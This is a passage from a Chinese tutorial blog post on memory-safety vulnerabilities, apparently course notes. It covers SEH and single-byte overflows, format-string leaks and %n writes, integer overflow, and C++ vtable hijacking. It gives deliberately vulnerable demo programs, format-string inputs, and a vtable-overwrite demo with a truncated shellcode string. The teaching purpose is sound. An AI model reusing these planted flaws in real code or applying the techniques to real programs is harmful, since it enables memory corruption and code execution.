class="line">23</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="type">char</span> shellcode[] = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">HackExceptionHandler</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;got an exception, press Enter to kill processn&quot;</span>);</span><br><span class="line">    <span class="built_in">getchar</span>();</span><br><span class="line">    <span class="built_in">ExitProcess</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test</span><span class="params">(<span class="type">char</span>* input)</span></span>&#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">200</span>];</span><br><span class="line">    <span class="type">int</span> zero = <span class="number">0</span>;</span><br><span class="line"> </span><br><span class="line">    __try    &#123;</span><br><span class="line">        <span class="built_in">strcpy</span>(buf, input);</span><br><span class="line">        zero = <span class="number">4</span> / zero;</span><br><span class="line">    &#125;__except(<span class="built_in">HackExceptionHandler</span>())</span><br><span class="line">    &#123;    &#125;</span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">test</span>(shellcode);    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>拖入OllyDBG动态调试，选择<strong>View下的SEH chain选项</strong>，就能看到当前栈中的SEH的情况。</p><p><img src="/2023/03/13/ruan-jian-lou-dong-pian/bac98b5900116c2c3eed7dc206112731.png" class="lazyload placeholder" data-srcset="/2023/03/13/ruan-jian-lou-dong-pian/bac98b5900116c2c3eed7dc206112731.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>从图中能看出，0012FF18是离栈顶最近的SHE（<strong>此时栈顶为0x0012FFC4</strong>）。接着我们在调试的栈窗口去验证存在的SEH链，如下图：</p><p><img src="/2023/03/13/ruan-jian-lou-dong-pian/856a46f639c316d5b9523bfba49dc50f.png" class="lazyload placeholder" data-srcset="/2023/03/13/ruan-jian-lou-dong-pian/856a46f639c316d5b9523bfba49dc50f.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/03/13/ruan-jian-lou-dong-pian/9cc8723beb1d5cd1a31bf041725d8e1e.png" class="lazyload placeholder" data-srcset="/2023/03/13/ruan-jian-lou-dong-pian/9cc8723beb1d5cd1a31bf041725d8e1e.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h3 id="单字节溢出"><a href="#单字节溢出" class="headerlink" title="单字节溢出"></a>单字节溢出</h3><p>单字节溢出是指程序中的缓冲区仅能溢出一个字节。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">single_func</span><span class="params">(<span class="type">char</span> *src)</span></span>&#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">256</span>];</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>;i &lt;= <span class="number">256</span>;i++)</span><br><span class="line">         buf[i] = src[i];            </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//感觉是水平不高的程序员写出的程序缺陷...</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>缓冲区溢出一般是通过覆盖堆栈中的返回地址，使程序跳转到shellcode或指定程序处执行。然而在一定条件下，<strong>单字节溢出</strong>也是可以利用的，它溢出的一个字节必须与栈帧指针紧挨，就是要求必须是函数中首个变量，一般这种情况很难出现。</p><h1 id="格式化字符串漏洞"><a href="#格式化字符串漏洞" class="headerlink" title="格式化字符串漏洞"></a>格式化字符串漏洞</h1><h2 id="基本概念-2"><a href="#基本概念-2" class="headerlink" title="基本概念"></a>基本概念</h2><p>格式化串漏洞和普通的栈溢出有相似之处，但又有所不同，都是利用了程序员的疏忽大意来改变程序运行的正常流程。</p><p>首先，什么是格式化字符串呢，print()、fprint()等*print()系列的函数可以按照一定的格式将数据进行输出，举个最简单的例子：</p><p><code>printf(&quot;My Name is:  %s&quot; , &quot;bingtangguan&quot;)</code></p><p>执行该函数后将返回字符串：My Name is：bingtangguan</p><p>该printf函数的<strong>第一个参数</strong>就是<strong>格式化字符串</strong>，它来告诉程序<strong>将数据以什么格式输出</strong>。</p><hr><p>printf()函数的一般形式为：printf(“format”, 输出表列)</p><p>format的结构为：%[标志][输出最小宽度][.精度][长度]类型</p><p>其中类型有以下常见的几种：</p><ul><li>％d整型输出，％ld长整型输出，</li><li>％o以八进制数形式输出整数，</li><li><strong>％x以十六进制数形式输出整数，</strong></li><li>％u以十进制数输出unsigned型数据(无符号数)。</li><li>％c用来输出一个字符，</li><li><strong>％s读取指定地址的内容（我的理解），输出一个字符串，</strong></li><li>％f用来输出实数，以小数形式输出。</li></ul><p>控制format参数之后结合<code>printf()函数特性</code>就可以进行相应攻击。</p><h2 id="格式化字符串漏洞的利用—数据泄露"><a href="#格式化字符串漏洞的利用—数据泄露" class="headerlink" title="格式化字符串漏洞的利用—数据泄露"></a>格式化字符串漏洞的利用—数据泄露</h2><p><strong>特性一：格式化函数允许可变参数</strong></p><p>C语言中的<strong>格式化函数</strong>（*printf族函数，包括printf，fprintf，sprintf，snprintf等）<strong>允许可变参数</strong>，它根据传入的格式化字符串获知可变参数的个数和类型，并依据格式化符号进行参数的输出。</p><p>如果调用这些函数时，给出了格式化符号串，但<strong>没有提供实际对应参数时</strong>，这些<u>函数会将格式化字符串后面的多个栈中的内容取出作为参数，并根据格式化符号将其输出</u>。</p><blockquote><p>当格式化符号为%x时以16进制的形式<strong>输出堆栈的内容</strong>，为%s时则<strong>输出对应地址所指向的字符串</strong>。（也就是说%s会有地址的跳转而%x只是输出堆栈的内容）</p></blockquote><p>下面以下述程序样本为例，分析格式化字符串溢出的原理。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">formatstring_func1</span><span class="params">(<span class="type">char</span> *buf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">     <span class="type">char</span> mark[] = “ABCD”;</span><br><span class="line">     <span class="built_in">printf</span>(buf);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>调用时如果传入”%x%x…%x”，则printf会打印出堆栈中的内容，不断增加%x的个数会<strong>逐渐显示堆栈中高地址的数据</strong>，从而导致堆栈中的数据泄漏。</p></blockquote><h3 id="泄露内存数据"><a href="#泄露内存数据" class="headerlink" title="泄露内存数据"></a>泄露内存数据</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> a=<span class="number">1</span>,b=<span class="number">2</span>,c=<span class="number">3</span>;</span><br><span class="line">    <span class="type">char</span> buf[]=<span class="string">&quot;test&quot;</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s %d %d %d\n&quot;</span>,buf,a,b,c);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>编译之后运行（<strong>Debug模式</strong>）： test 1 2 3</p><p>增加一个printf()的format参数，改为：<br>printf(“%s %d %d %d %x\n”,buf,a,b,c)，<br>编译后运行（Debug模式）：<br> test 1 2 3 <strong>12C62E</strong></p><blockquote><p>%s读取buf指定地址的数据，读取出test</p><p>考虑栈帧状态，参数入栈（字符串 str 的地址）后，通过%x 依次读参数下面的内存数据时，很快就读到了原来函数的局部变量 str 的数据了。</p></blockquote><p><strong>原因</strong>：函数调用，是要参数入栈的；printf函数会到入栈的参数位置去取参数；在没有给出%x的参数的时候，将自动将栈区参数的下一个地址作为参数输入。</p><h3 id="读取任意内存地址的数据"><a href="#读取任意内存地址的数据" class="headerlink" title="读取任意内存地址的数据"></a>读取任意内存地址的数据</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">char</span> str[<span class="number">200</span>];</span><br><span class="line">    <span class="built_in">fgets</span>(str,<span class="number">200</span>,stdin);</span><br><span class="line">    <span class="built_in">printf</span>(str);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>编译后运行（<strong>Release模式</strong>）并输入：AAAA%x%x%x%x</p><p><code>建议%x更换为%08x.</code>输出完整的8位地址</p><p>我们成功读到了AAAA：AAAA18FE84BB40603041414141（0x41就是ASCII的字母A的值）。</p><p><font color=red>思考：这个41414141是怎么读到的？</font></p><p>考虑栈帧状态，参数入栈（字符串 str 的地址）后，通过%x 依次读<strong>参数下面的内存数据</strong>时，很快就读到了<strong>原来函数的局部变量 str 的数据了</strong>。</p><p>执行printf(str)语句的时候，<u>对比Debug模式和Release模式的栈帧结构</u>：</p><p><img src="/2023/03/13/ruan-jian-lou-dong-pian/f29f928cb0850ae7f4fd7b4990a60022.png" class="lazyload placeholder" data-srcset="/2023/03/13/ruan-jian-lou-dong-pian/f29f928cb0850ae7f4fd7b4990a60022.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>用OllyDBG查看Release模式下栈帧的结构：</p><p><img src="/2023/03/13/ruan-jian-lou-dong-pian/6db07b25ea157300789eb2d8a6361578.png" class="lazyload placeholder" data-srcset="/2023/03/13/ruan-jian-lou-dong-pian/6db07b25ea157300789eb2d8a6361578.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>Debug 模式下，因为开辟了足够大的栈帧并初始化，char str[200]是从靠近EBP的地址分配空间，如果要读到 str 的地址，需要很多的格式化字符；但是，Relase 模式下，可以看到，并没有严格按照制式的栈帧分配，而是考虑运行性能，在执行到 printf(str)的时候，栈区自顶到底部分为存着“printf 函数参数|fgets 函数参数|str 数组”的内容，在 Main 函数的 retn 语句前，才有一个 add esp XX 的处理。<br>如果将 AAAA 换成地址，第 4 个%x，换成%s的读取参数指定的地址上的数据呢？是不是就可以读取任意内存地址的数据了？<br>比如我们输入：AAAA%x%x%x%s<br>这样就构造了去获取 0x41414141 地址上的数据的输入。</p><blockquote><p>外话：起初我并不理解格式化字符串是怎么读取栈帧内容的，为了理解我调用了ollydbg查看栈帧结构，原来是printf参数不够，会往栈帧高地址读取，依次读取fgets 函数参数地址的值，然后到str的值。就是这样：）</p></blockquote><h2 id="格式化字符串漏洞的利用—数据写入"><a href="#格式化字符串漏洞的利用—数据写入" class="headerlink" title="格式化字符串漏洞的利用—数据写入"></a>格式化字符串漏洞的利用—数据写入</h2><h3 id="特性二：利用-n格式符写入数据"><a href="#特性二：利用-n格式符写入数据" class="headerlink" title="特性二：利用%n格式符写入数据"></a>特性二：利用%n格式符写入数据</h3><p>更危险的是<u>格式化符号%n</u>，它的作用是将格式化函数输出字符串的长度，写入函数参数指定的位置。</p><p>%n不向printf传递格式化信息，而是<strong>令printf把自己到该点已打出的字符总数放到相应变元指向的整形变量中，</strong>比如：<br>printf(“Jamsa%n”, &amp;first_count)`<br>将向整型变量first_count处写入整数5。</p><hr><p><code>Sprintf</code>函数的作用是<strong>把格式化的数据写入某个字符串缓冲区</strong>。函数原型为：</p><p><code>int sprintf( char *buffer, const char *format, [ argument] … );</code></p><p>观察如下程序（Release模式）：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">formatstring_func2</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">100</span>];</span><br><span class="line">    <span class="built_in">sprintf</span>(buffer, argv[<span class="number">1</span>]);<span class="comment">//argv[1]有什么用?</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>如果调用这段程序时用”aaaabbbbcc%n”作为命令行参数，将会怎么样？</p><p>结果：数值10就会被写入地址为0x61616161（aaaa）的内存单元。</p><ul><li>首先<blockquote><p>“aaaabbbbcc”写入buffer；</p></blockquote></li><li>然后<blockquote><p>从堆栈中取下一个参数，并将其当作整数指针使用，由于调用sprintf时<strong>没有传入下一个参数，因而buffer中的前四个字节被当作参数</strong>，这样已输出字串的长度10就被写入内存地址0x61616161处。</p></blockquote></li></ul><p>通过这种格式化字符串的利用方式，可以实现<strong>向任意内存写入任意数值</strong>。</p><h3 id="特性三：自定义打印字符串宽度"><a href="#特性三：自定义打印字符串宽度" class="headerlink" title="特性三：自定义打印字符串宽度"></a>特性三：自定义打印字符串宽度</h3><p><strong>实验</strong>：利用%n格式化符号和自定义打印字符串宽度，写入某内存地址任意数据。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="built_in">main</span>()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> num=<span class="number">66666666</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Before: num = %d\n&quot;</span>, num);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%d%n\n&quot;</span>, num, &amp;num);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;After: num = %d\n&quot;</span>, num); </span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>运行：<br>Before: num = 66666666<br>66666666<br>After: num = 8</p><p>现在我们已经知道可以利用%n向内存中写入值，<font color=red>如果我们写的值(比如一个返回地址）非常大，怎么来构造这样的值？</font></p><p>关于打印字符串宽度的问题，<strong>在格式符中间加上一个十进制整数来表示输出的最少位数</strong>，<u>若实际位数多于定义的宽度，则按实际位数输出，若实际位数少于定义的宽度则补以空格或0</u>。我们把上一段代码做一下修改并看一下效果：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="built_in">main</span>()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> num=<span class="number">66666666</span>; </span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Before: num = %d\n&quot;</span>, num);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%100d%n\n&quot;</span>, num, &amp;num);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;After: num = %d\n&quot;</span>, num);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>运行：<br>Before: num = 66666666</p><br/><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">66666666</span><br></pre></td></tr></table></figure><p>After: num = 100</p><p><em>我们也可以使用%02333d这种形式。在打印数值右侧用0补齐不足位数的方式来补齐，而不是空格。</em></p><h1 id="整数溢出漏洞"><a href="#整数溢出漏洞" class="headerlink" title="整数溢出漏洞"></a>整数溢出漏洞</h1><p>高级程序语言中，整数分为无符号数和有符号数两类，其中有符号负整数最高位为1，正整数最高位为0，无符号整数则无此限制。常见的整数类型有8位、16位、32位以及64位等，对应的每种类型整数都包含一定的范围。当对整数进行加、乘等运算时，计算的结果如果大于该类型的整数所表示的范围时，就会发生整数溢出。</p><p>根据溢出原理的不同，整数溢出可以分为以下三类：</p><ul><li>存储溢出<blockquote><p><strong>存储溢出</strong>是使用另外的数据类型来存储整型数造成的。例如，把一个大的变量放入一个小变量的存储区域，最终是<strong>只能保留小变量能够存储的位</strong>，其他的位都无法存储，以至于造成安全隐患。</p></blockquote></li><li>运算溢出<blockquote><p><strong>运算溢出</strong>是对整型变量进行运算时没有考虑到其<strong>边界范围</strong>，造成运算后的数值范围超出了其存储空间。</p></blockquote></li><li>符号问题<blockquote><p>整型数可分为有符号整型数和无符号整型数两种。在开发过程中，一般长度变量使用无符号整型数，然而如果程序员<strong>忽略了符号，在进行安全检查判断的时候就可能出现问题。</strong></p></blockquote></li></ul><h2 id="整数溢出示例"><a href="#整数溢出示例" class="headerlink" title="整数溢出示例"></a>整数溢出示例</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">char</span>* <span class="title">integer_overflow</span><span class="params">(<span class="type">int</span>* data, <span class="type">unsigned</span> <span class="type">int</span> len)</span></span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> size = len + <span class="number">1</span>;</span><br><span class="line">    <span class="type">char</span> *buffer = (<span class="type">char</span>*)<span class="built_in">malloc</span>(size);</span><br><span class="line">    <span class="keyword">if</span>(!buffer)       </span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    <span class="built_in">memcpy</span>(buffer, data, len);</span><br><span class="line">    buffer[len]=’\’;</span><br><span class="line">      <span class="keyword">return</span> buffer;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该函数将用户输入的数据拷贝到新的缓冲区，并在最后写入结尾符0。如果攻击者将0xFFFFFFFF作为参数传入len，当计算size时会发生整数溢出，malloc会分配大小为0的内存块（<u>将得到有效地址</u>），后面执行memcpy时会发生堆溢出。</p><p><code>整数溢出一般不能被单独利用，而是用来绕过目标程序中的条件检测，进而实现其他攻击。</code></p><h2 id="分析如下实例"><a href="#分析如下实例" class="headerlink" title="分析如下实例"></a>分析如下实例</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;shellapi.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_INFO 32767</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">func</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;   </span><br><span class="line">    <span class="built_in">ShellExecute</span>(<span class="literal">NULL</span>,<span class="string">&quot;open&quot;</span>,<span class="string">&quot;notepad&quot;</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,SW_SHOW); </span><br><span class="line">    <span class="comment">//打开记事本</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">func1</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">    <span class="built_in">ShellExecute</span>(<span class="literal">NULL</span>,<span class="string">&quot;open&quot;</span>,<span class="string">&quot;calc&quot;</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,SW_SHOW);  </span><br><span class="line">    <span class="comment">//打开计算器</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">void</span> (*fuc_ptr)() = func;</span><br><span class="line">    <span class="type">char</span> info[MAX_INFO];      </span><br><span class="line">    <span class="type">char</span> info1[<span class="number">30000</span>];</span><br><span class="line">    <span class="type">char</span> info2[<span class="number">30000</span>];</span><br><span class="line">    <span class="built_in">freopen</span>(<span class="string">&quot;input.txt&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);    </span><br><span class="line">    cin.<span class="built_in">getline</span>(info1,<span class="number">30000</span>,<span class="string">&#x27; &#x27;</span>);     </span><br><span class="line">    cin.<span class="built_in">getline</span>(info2,<span class="number">30000</span>,<span class="string">&#x27; &#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">short</span> len1 = <span class="built_in">strlen</span>(info1);</span><br><span class="line">    <span class="type">short</span> len2 = <span class="built_in">strlen</span>(info2);</span><br><span class="line">    <span class="type">short</span> all_len = len1 + len2;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(all_len&lt;MAX_INFO)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">strcpy</span>(info,info1);</span><br><span class="line">        <span class="built_in">strcat</span>(info,info2);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">fuc_ptr</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>short型整数表示范围为-32768~32767，当len1+len2超过了short型整数的最大范围后会变为一个<strong>负数</strong>，将满足<strong>all_len&lt;MAX_INFO</strong>的判断条件，进而进入if的分支语句。于是继续执行if语句的时候，将info1与info2的内容都写进info中。</p><p><font color=red>思考：如何实现fuc_ptr的覆盖，改变程序执行？</font></p><h1 id="攻击C-虚函数"><a href="#攻击C-虚函数" class="headerlink" title="攻击C++虚函数"></a>攻击C++虚函数</h1><h2 id="C-面向对象语言的漏洞"><a href="#C-面向对象语言的漏洞" class="headerlink" title="C++面向对象语言的漏洞"></a>C++面向对象语言的漏洞</h2><ul><li><strong>多态</strong>是面向对象的一个重要特性，在C++中，这个特性主要靠对虚函数的动态调用来实现。</li><li>C++类的成员函数声明时，若使用关键字<code>virtual</code>进行修饰，则被称为虚函数。</li><li>虚函数的入口地址被统一保存在<strong>虚表</strong>（Vtable）中。</li><li>对象在使用虚函数时，先通过<strong>虚表指针找到虚表</strong>，然后<strong>从虚表中取出最终的函数入口地址进行调用</strong>。</li></ul><p>C++虚函数和类在内存中的位置关系如图所示：</p><p>（1）<strong>虚表指针保存在对象的内存空间中，紧接着虚表指针的是其他成员变量</strong>；</p><p>（2）<strong>虚函数入口地址被统一存在虚表中</strong>。</p><p><img src="/2023/03/13/ruan-jian-lou-dong-pian/21e4dd1a15e11e8ef6a6efc88cc7a330.png" class="lazyload placeholder" data-srcset="/2023/03/13/ruan-jian-lou-dong-pian/21e4dd1a15e11e8ef6a6efc88cc7a330.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h2 id="攻击虚函数"><a href="#攻击虚函数" class="headerlink" title="攻击虚函数"></a>攻击虚函数</h2><p>对象使用虚函数时通过</p><p>（1）<font color=red>调用虚表指针找到虚表</font>，然后</p><p>（2）<font color=red>从虚表中取出最终的函数入口地址进行调用</font>。</p><p>如果虚表里存储的<strong>虚函数指针被篡改</strong>，程序调用虚函数的时候就会执行篡改后的指定地址的<strong>shellcode</strong>，就会发动虚函数攻击。</p><p>通过下述代码来复现虚函数攻击。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="type">char</span> shellcode[] =“xFC\x68\x6A….. \xA4\x8B\x42\x00”;<span class="comment">// set fake virtual function pointer</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Failwest</span>&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">200</span>];</span><br><span class="line">  <span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">test</span><span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;Class Vtable::test()&quot;</span>&lt;&lt;endl;</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;;</span><br><span class="line">Failwest overflow, *p;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">main</span><span class="params">(<span class="type">void</span>)</span></span>&#123;</span><br><span class="line">  <span class="type">char</span> *p_vtable;</span><br><span class="line">  p_vtable = overflow.buf – <span class="number">4</span>; </span><br><span class="line">  <span class="comment">//得到虚表指针</span></span><br><span class="line">  <span class="type">int</span> len = <span class="built_in">strlen</span>(shellcode);</span><br><span class="line">  __asm <span class="type">int</span> <span class="number">3</span>;  <span class="comment">//人为增加一个断点 </span></span><br><span class="line">  p_vtable[<span class="number">0</span>] = <span class="number">0x54</span>;</span><br><span class="line">  p_vtable[<span class="number">1</span>] = <span class="number">0x8c</span>;</span><br><span class="line">  p_vtable[<span class="number">2</span>] = <span class="number">0x42</span>;</span><br><span class="line">  p_vtable[<span class="number">3</span>] = <span class="number">0x00</span>;</span><br><span class="line">  <span class="comment">//将虚表指针进行修改，修改为 0x00428c54。</span></span><br><span class="line">  <span class="comment">//这个值需要根据实际系统进行重新计算</span></span><br><span class="line">  <span class="built_in">strcpy</span>(overflow.buf, shellcode);</span><br><span class="line">  <span class="comment">//这是我们能利用的缓冲区</span></span><br><span class="line">  <span class="comment">//这意味着，恶意代码shellcode被存储到了overflow.buf位置。</span></span><br><span class="line">  <span class="comment">//shellcode(包含了我们要植入到内存中的恶意代码)</span></span><br><span class="line">  p = &amp;overflow;</span><br><span class="line">  p-&gt;<span class="built_in">test</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>我们希望通过调用test虚函数的时候，跳转到这个位置去执行恶意代码。但是，怎么让调用test虚函数的时候，<strong>通过虚表指针找到的虚函数指针</strong>就是我们期待的目标呢？</p><p><img src="/2023/03/13/ruan-jian-lou-dong-pian/195c17615edfa3f9ee341b403e54329d.png" class="lazyload placeholder" 